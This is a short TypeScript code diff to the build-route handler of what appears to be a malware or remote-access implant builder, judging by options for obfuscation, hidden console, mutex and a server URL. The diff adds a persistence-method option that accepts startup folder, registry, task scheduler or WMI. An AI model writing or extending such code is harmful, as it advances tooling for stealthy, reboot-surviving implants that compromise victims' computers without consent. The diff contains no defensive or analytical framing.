@@ -46,6 +46,7 @@ export async function handleBuildRoutes(
         disableCgo,
         obfuscate,
         enablePersistence,
+        persistenceMethod,
         mutex,
         disableMutex,
         hideConsole,
@@ -112,6 +113,11 @@ export async function handleBuildRoutes(
       });
 
       const safeNoPrinting = !!noPrinting;
+      const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
+      const safePersistenceMethod =
+        typeof persistenceMethod === 'string' && VALID_PERSISTENCE_METHODS.has(persistenceMethod.toLowerCase())
+          ? persistenceMethod.toLowerCase()
+          : 'startup';
       deps.startBuildProcess(buildId, {
         platforms: allowedPlatforms,
         serverUrl: safeServerUrl,
@@ -122,6 +128,7 @@ export async function handleBuildRoutes(
         disableCgo,
         obfuscate: !!obfuscate,
         enablePersistence,
+        persistenceMethod: safePersistenceMethod,
         hideConsole: !!hideConsole,
         noPrinting: safeNoPrinting,
       });
